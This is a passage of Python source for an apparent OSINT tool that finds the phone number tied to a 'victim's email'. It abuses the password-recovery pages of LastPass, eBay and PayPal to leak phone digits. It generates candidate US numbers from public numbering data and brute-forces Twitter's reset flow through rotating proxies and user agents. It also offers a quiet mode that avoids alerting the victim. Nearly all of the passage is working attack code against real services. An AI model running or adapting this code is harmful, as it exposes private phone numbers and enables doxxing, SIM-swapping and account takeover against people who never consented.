                "%sTwitter reports MAX attempts reached. Need to change IP. It happened while trying phone %s %s ",
                RED, phone_number, ENDC)
            continue

        response = session.get(
            "https://twitter.com/account/send_password_reset",
            headers={
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": user_agent,
                "Accept":
                    "text/html,application/xhtml+xml,application/xml;q=0.9,"
                    "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Referer":
                "https://twitter.com/account/begin_password_reset",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            },
            proxies=proxy,
            verify=verifyProxy
        )
        masked_email = ""
        regex_output = re.search(
            r'<strong .+>([a-zA-Z]+\*+@[a-zA-Z\*\.]+)<\/strong>', response.text)
        if regex_output and regex_output.group(1):
            masked_email = regex_output.group(1)
            if \
                    len(victim_email) == len(masked_email) \
                    and victim_email[0] == masked_email[0] \
                    and victim_email[1] == masked_email[1] \
                    and victim_email[victim_email.find('@')+1: victim_email.find('@')+2] \
                == masked_email[masked_email.find('@')+1: masked_email.find('@')+2]:
                logger.info(
                    "%sTwitter found that the possible phone number for %s is: %s %s",
                    GREEN, victim_email, phone_number, ENDC)
                found_possible_number = True
            else:
                if verbose:
                    logger.info(
                        "%sTwitter did not find a match for email: %s and number: %s %s",
                        YELLOW, masked_email, phone_number, ENDC)
        else:
            if verbose:
                logger.info(
                    "%sTwitter did not display a masked email for number: %s %s", YELLOW, phone_number, ENDC)
            continue
    if not found_possible_number:
        logger.error(
            "%sCouldn't find a phone number associated to %s %s", RED, args.email, ENDC)


def start_scrapping(email, quiet_mode):
    """
    Starts scrapping
    :param email: Email to search for
    :param quiet_mode: Quiet mode selection
    :return:
    """
    logger.info("Starting scraping online services...")
    if quiet_mode:
        scrape_paypal(email)
    else:
        scrape_ebay(email)
        scrape_last_pass(email)
        scrape_paypal(email)


def scrape_last_pass(email):
    """
    Scrape last pass service
    :param email: Email to scrape
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Scraping Lastpass...")
    user_agent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    response = session.get(
        "https://lastpass.com/recover.php",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxy,
        verify=verifyProxy
    )
    csrf_token = re.search(
        '<input type="hidden" name="token" value="(.+?)">', response.text).group(1)
    response = session.post(
        "https://lastpass.com/recover.php",
        headers={
            "Cache-Control": "max-age=0",
            "Origin": "https://lastpass.com",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": user_agent,
            "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer": "https://lastpass.com/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="cmd=sendemail" + "&token=" + csrf_token + "&username=" + email,
        proxies=proxy,
        verify=verifyProxy
    )
    last_two_digits = ""
    regex_output = re.search(
        "We sent an SMS with a verification code to .*>(\+?)(.+([0-9]{2}))<\/strong>", response.text)
    if regex_output and regex_output.group(3):
        last_two_digits = regex_output.group(3)
        logger.info("%sLastpass reports that the last 2 digits are: %s %s",
                    GREEN, last_two_digits, ENDC)
        if regex_output.group(1):
            logger.info(
                "%sLastpass reports a non US phone number %s", GREEN, ENDC)
            logger.info(
                "%sLastpass reports that the length of the phone number (including country code) is %s digits %s",
                GREEN, str(len(regex_output.group(2).replace("-", ""))), ENDC)
        else:
            logger.info(
                "%sLastpass reports a US phone number %s", GREEN, ENDC)
            logger.info(
                "%sLastpass reports that the length of the phone number (without country code) is %s digits %s",
                GREEN, str(len(regex_output.group(2).replace("-", ""))), ENDC)
    else:
        logger.info("%sLastpass did not report any digits %s", YELLOW, ENDC)


def scrape_ebay(email):
    """
    Scrapes ebay
    :param email: Email to use to scrape ebay
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Scraping Ebay...")
    user_agent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    response = session.get(
        "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxy,
        verify=verifyProxy
    )
    regex_input = ""
    regex_output = re.search(r'value="(\w{60,})"', response.text)
    if regex_output and regex_output.group(1):
        regex_input = regex_output.group(1)
    else:
        logger.info("%sEbay did not report any digits %s", YELLOW, ENDC)
        return

    response = session.post(
        "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
        headers={
            "Cache-Control": "max-age=0",
            "Origin": "https://fyp.ebay.com",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": user_agent,
            "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer":
            "https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&clientapptype=19&signInUrl="
            "https%3A%2F%2Fwww.ebay.com%2Fsignin%3Ffyp%3Dsgn%26siteid%3D0%26co_partnerId%3D0%26ru%3Dhttps%25"
                            "3A%252F%252Fwww.ebay.com%252F&otpFyp=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="ru=https%253A%252F%252Fwww.ebay.com%252F"
        + "&showSignInOTP="
        + "&signInUrl="
        + "&clientapptype=19"
        + "&reqinput=" + regex_input
        + "&rmvhdr=false"
        + "&gchru=&__HPAB_token_text__="
        + "&__HPAB_token_string__="
        + "&pageType="
        + "&input=" + email,
        proxies=proxy,
        verify=verifyProxy)
    first_digit = ""
    last_two_digits = ""
    regex_output = re.search(
        "text you at ([0-9]{1})xx-xxx-xx([0-9]{2})", response.text)
    if regex_output:
        if regex_output.group(1):
            first_digit = regex_output.group(1)
            logger.info("%sEbay reports that the first digit is: %s %s",
                        GREEN, first_digit, ENDC)
        if regex_output.group(2):
            last_two_digits = regex_output.group(2)
            logger.info("%sEbay reports that the last 2 digits are: %s %s",
                        GREEN, last_two_digits, ENDC)
    else:
        logger.info("%sEbay did not report any digits %s", YELLOW, ENDC)


def scrape_paypal(email):
    """
    Scrapes paypal using email
    :param email: Email to scrape
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Scraping Paypal...")
    user_agent = random.choice(userAgents)
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    response = session.get(
        "https://www.paypal.com/authflow/password-recovery/",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxy,
        verify=verifyProxy
    )
    _csrf = ""
    regex_output = re.search(
        r'"_csrf":"([a-zA-Z0-9+\/]+={0,3})"', response.text)
    if regex_output and regex_output.group(1):
        _csrf = regex_output.group(1)
    else:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)
        return

    response = session.post(
        "https://www.paypal.com/authflow/password-recovery",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://www.paypal.com",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Referer": "https://www.paypal.com/authflow/password-recovery/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="email=" + email + "&_csrf=" + _csrf,
        proxies=proxy,
        verify=verifyProxy
    )
    _csrf = _sessionID = jse = ""
    regex_output = re.search(
        r'"_csrf":"([a-zA-Z0-9+\/]+={0,3})"', response.text)
    if regex_output and regex_output.group(1):
        _csrf = regex_output.group(1)
    regex_output = re.search(r'_sessionID" value="(\w+)"', response.text)
    if regex_output and regex_output.group(1):
        _sessionID = regex_output.group(1)
    regex_output = re.search(r'jse="(\w+)"', response.text)
    if regex_output and regex_output.group(1):
        jse = regex_output.group(1)
    if not _csrf or not _sessionID or not jse:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)
        return

    response = session.post(
        "https://www.paypal.com/auth/validatecaptcha",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://www.paypal.com",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Referer": "https://www.paypal.com/authflow/password-recovery/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        data="captcha="
        + "&_csrf=" + _csrf
        + "&_sessionID=" + _sessionID
        + "&jse=" + jse  # TODO
        + "&ads_token_js=b2c9ad327f5fa65af5a0a0a4cfa912d5cadf0f593027afffadd959390753d44d&afbacc5007731416=2e21541bb2d5470b",
        proxies=proxy,
        verify=verifyProxy
    )
    client_instance_id = ""
    regex_output = re.search(
        '"clientInstanceId":"([a-zA-Z0-9-]+)"', response.text)
    if regex_output and regex_output.group(1):
        client_instance_id = regex_output.group(1)
    else:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)
        return

    response = session.get(
        "https://www.paypal.com/authflow/entry/?clientInstanceId=" + client_instance_id,
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Referer": "https://www.paypal.com/authflow/password-recovery/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        },
        proxies=proxyList,
        verify=verifyProxy
    )
    last_digits = ""
    regex_output = re.search(
        r"Mobile <span.+((\d+)\W+(\d+))<\/span>", response.text)
    if regex_output and regex_output.group(3):
        last_digits = regex_output.group(3)
        logger.info("%sPaypal reports that the last %s digits are: %s %s",
                    GREEN, len(regex_output.group(3)), last_digits, ENDC)
        if regex_output.group(2):
            first_digit = regex_output.group(2)
            logger.info(
                "%sPaypal reports that the first digit is: %s %s", GREEN, first_digit, ENDC)
        if regex_output.group(1):
            logger.info(
                "%sPaypal reports that the length of the phone number (without country code) is %s digits %s",
                GREEN, len(regex_output.group(1)), ENDC)
            # TODO: remove spaces
    else:
        logger.info("%sPaypal did not report any digits %s", YELLOW, ENDC)


# GENERADORES
def get_possible_phone_numbers(masked_phone):
    """
    Returns all possible valid phone numbers according to NANPA based on a partial phone number
    :param masked_phone: Masked phone
    :return:
    """
    global poolingCache
    possible_phone_numbers = []
    nanpa_file_url = "https://www.nationalnanpa.com/nanp1/allutlzd.zip"
    # Check if we need to download/update NANPA file
    nampa_file = "allutlzd"
    if \
            not os.path.exists("./" + nampa_file + ".zip") \
            or (time.time() - os.path.getmtime("./" + nampa_file + ".zip")) > (24*60*60):
        logger.info(
            "NANPA file missing or needs to be updated. Downloading now...")
        response = requests.get(nanpa_file_url)
        with open(nampa_file + ".zip", "wb") as code:
            code.write(response.content)
        logger.info("NANPA file downloaded successfully")
    archive = zipfile.ZipFile("./" + nampa_file + ".zip", 'r')
    file = archive.read(nampa_file + '.txt').decode('utf-8')
    archive.close()

    # Only assigned area codes and exchanges
    regex_assigned = r'\s[0-9A-Z\s]{4}\t.*\t[A-Z\-\s]+\t[0-9\\]*[\t\s]+AS'
    # Area code + exchange
    regex_area_code_exchange = re.sub(
        "X", "[0-9]{1}", "(" + masked_phone[:3] + "-" + masked_phone[3:6] + ")")
    # Format: [state, area_code-exchange]
    regex_possible_area_codes = re.findall(
        r"([A-Z]{2})\s\t" + regex_area_code_exchange + regex_assigned, file)
    remaining_unsolved_digits = masked_phone[7:].count("X")
    masked_phone_formatted = masked_phone[7:].replace("X", "{}")
    for possible_area_codes in regex_possible_area_codes:
        state = possible_area_codes[0]
        area_code = possible_area_codes[1].split("-")[0]
        exchange = possible_area_codes[1].split("-")[1]
        if area_code not in poolingCache:
            cache_valid_block_numbers(state, area_code)
        if masked_phone[6] == 'X':
            # Check for available block numbers for that area code and exchange
            if area_code in poolingCache and exchange in poolingCache[area_code]:
                block_numbers = poolingCache[area_code][exchange]['blockNumbers']
            else:
                block_numbers = ["0", "1", "2", "3",
                                 "4", "5", "6", "7", "8", "9"]
        else:
            # User provided block_number
            if \
                    area_code in poolingCache \
                    and exchange in poolingCache[area_code] \
                    and masked_phone[6] not in poolingCache[area_code][exchange]['blockNumbers']:
                # User provided invalid block number
                block_numbers = []
            else:
                block_numbers = [masked_phone[6]]
        for block_number in block_numbers:
            # Add the rest of random subscriber number digits
            for x in product("0123456789", repeat=remaining_unsolved_digits):
                possible_phone_numbers.append(
                    area_code + exchange + block_number + masked_phone_formatted.format(*x))
    return possible_phone_numbers


def cache_valid_block_numbers(state, area_code):
    """
    Cache the valid block numbers for state and area code
    :param state: State
    :param area_code: Area code
    :return:
    """
    global userAgents
    global proxyList
    global poolingCache
    proxy = random.choice(proxyList) if proxyList else None
    session = requests.Session()
    # We need the cookies or it will error
    session.get(
        "https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=N")
    response = session.post(
        "https://www.nationalpooling.com/pas/blockReportDisplay.do",
        headers={
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": random.choice(userAgents),
            "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
            "Origin": "https://www.nationalpooling.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "DNT": "1"
        },
        data="stateAbbr=" + state + "&npaId=" + area_code +
        "&rtCntrId=" + "ALL" + "&reportType=" + "3",
        proxies=proxy,
        verify=verifyProxy
    )
    soup = BeautifulSoup(response.text, 'html.parser')
    available_block_numbers = []
    area_code_cells = soup.select("form table td:nth-of-type(1)")
    for area_code_cell in area_code_cells:
        if area_code_cell.string and area_code_cell.string.strip() == area_code:
            exchange = area_code_cell.next_sibling.next_sibling.string.strip()
            block_number = area_code_cell.next_sibling.next_sibling.next_sibling.next_sibling.string.strip()
            if area_code not in poolingCache:
                poolingCache[area_code] = {}
                poolingCache[area_code][exchange] = {}
                poolingCache[area_code][exchange]['blockNumbers'] = []
            elif exchange not in poolingCache[area_code]:
                poolingCache[area_code][exchange] = {}
                poolingCache[area_code][exchange]['blockNumbers'] = []
            poolingCache[area_code][exchange]['blockNumbers'].append(
                block_number)
            # Temporarily we store the invalid block_numbers
    for area_code in poolingCache:
        # Let's switch invalid block_numbers for valid ones
        for exchange in poolingCache[area_code]:
            poolingCache[area_code][exchange]['blockNumbers'] = \
                [
                n for n in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
                if n not in poolingCache[area_code][exchange]['blockNumbers']
            ]


def set_proxy_list():
    global proxyList
    proxy_file = open(args.proxies, "r")
    if not proxy_file.mode == 'r':
        proxy_file.close()
        logger.error("%sCould not read file %s %s", RED, args.proxies, ENDC)
    file_content = proxy_file.read()
    file_content = filter(None, file_content)
    # Remove last \n if needed
    proxy_list_not_formatted = file_content.split("\n")
    proxy_file.close()
    for proxy_not_formatted in proxy_list_not_formatted:
        separator_position = proxy_not_formatted.find("://")
        proxyList.append(
            {proxy_not_formatted[:separator_position]: proxy_not_formatted[separator_position+3:]})


parser = argparse.ArgumentParser(
    description='An OSINT tool to find phone numbers associated to email addresses')
subparsers = parser.add_subparsers(help='commands')
scrape_parser = subparsers.add_parser(
    'scrape', help='scrape online services for phone number digits')
scrape_parser.add_argument(
    "-e", required=True, metavar="EMAIL", dest="email", help="victim's email address")
scrape_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies",
                           help="a file with a list of https proxies to use. Format: https://127.0.0.1:8080")
scrape_parser.add_argument("-q", dest="quiet", action="store_true",
                           help="scrape services that do not alert the victim")

generator_parser = subparsers.add_parser(
    'generate', help="generate all valid phone numbers based on NANPA's public records")
generator_parser.add_argument("-m", required=True, metavar="MASK",
                              dest="mask", help="a masked 10-digit US phone number as in: 555XXX1234")
generator_parser.add_argument(
    "-o", metavar="FILE", dest="file", help="outputs the list to a dictionary")
generator_parser.add_argument(
    "-q", dest="quiet", action="store_true", help="use services that do not alert the victim")
generator_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies",
                              help="a file with a list of https proxies to use. Format: https://127.0.0.1:8080")

bruteforce_parser = subparsers.add_parser(
    'bruteforce', help='bruteforce using online services to find the phone number')
bruteforce_parser.add_argument(
    "-e", required=True, metavar="EMAIL", dest="email", help="victim's email address")
bruteforce_parser.add_argument("-m", metavar="MASK", dest="mask",
                               help="a masked, 10-digit US phone number as in: 555XXX1234")
bruteforce_parser.add_argument(
    "-d", metavar="DICTIONARY", dest="file", help="a file with a list of numbers to try")
bruteforce_parser.add_argument("-p", metavar="PROXYLIST", dest="proxies",
                               help="a file with a list of HTTPS proxies to use. Format: https://127.0.0.1:8080")
bruteforce_parser.add_argument(
    "-q", dest="quiet", action="store_true", help="use services that do not alert the victim")
bruteforce_parser.add_argument(
    "-v", dest="verbose", action="store_true", help="verbose output")

args = parser.parse_args()
# Add missing param
try:
    vars(args)["action"] = sys.argv[1]
except IndexError as e:
    logger.error("Please, add an option to execute")
    parser.print_help()
    sys.exit()

if args.action == "scrape":
    if args.proxies:
        set_proxy_list()
    start_scrapping(args.email, args.quiet)

elif args.action == "generate":
    if not re.match("^[0-9X]{10}", args.mask):
        logger.error(
            "%sYou need to pass a US phone number masked as in: 555XXX1234", RED, ENDC)
        exit()
    if args.proxies:
        set_proxy_list()
    possible_phone_number = get_possible_phone_numbers(args.mask)
    if args.file:
        with open(args.file, 'w') as f:
            f.write('\n'.join(possible_phone_number))
        logger.info("%sDictionary created successfully at %s %s",
                    GREEN, os.path.realpath(f.name), ENDC)
        f.close()
    else:
        logger.info("%sThere are %s possible numbers %s", GREEN,
                    str(len(possible_phone_number)), ENDC)
        logger.info("%s %s %s", GREEN, str(possible_phone_number), ENDC)

elif args.action == "bruteforce":
    if args.email and not re.match(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)", args.email):
        logger.error("%sEmail is invalid", RED, ENDC)
        exit()
    if (args.mask and args.file) or (not args.mask and not args.file):
        logger.error(
            "%sYou need to provide a masked number or a file with numbers to try %s", RED, ENDC)
        exit()
    if args.mask and not re.match("^[0-9X]{10}", args.mask):
        logger.error(
            "%sYou need to pass a 10-digit US phone number masked as in: 555XXX1234 %s", RED, ENDC)
        exit()
    if args.file and not os.path.isfile(args.file):
        logger.error("%sYou need to pass a valid file path %s", RED, ENDC)
        exit()

    logger.info("Looking for the phone number associated to %s ...", args.email)
    if args.mask:
        possiblePhoneNumbers = get_possible_phone_numbers(args.mask)
    else:
        f = open(args.file, "r")
        if not f.mode == 'r':
            f.close()
            logger.error("%sCould not read file %s %s", RED, args.file, ENDC)
            exit()
        file_content = f.read()
        file_content = filter(None, file_content)  # Remove last \n if needed
        possiblePhoneNumbers = file_content.split("\n")
        f.close()
    if args.proxies:
        set_proxy_list()
    start_brute_force(possiblePhoneNumbers, args.email,
                      args.quiet, args.verbose)
else:
    logger.error("%sAction not recognized", RED, ENDC)
    exit()
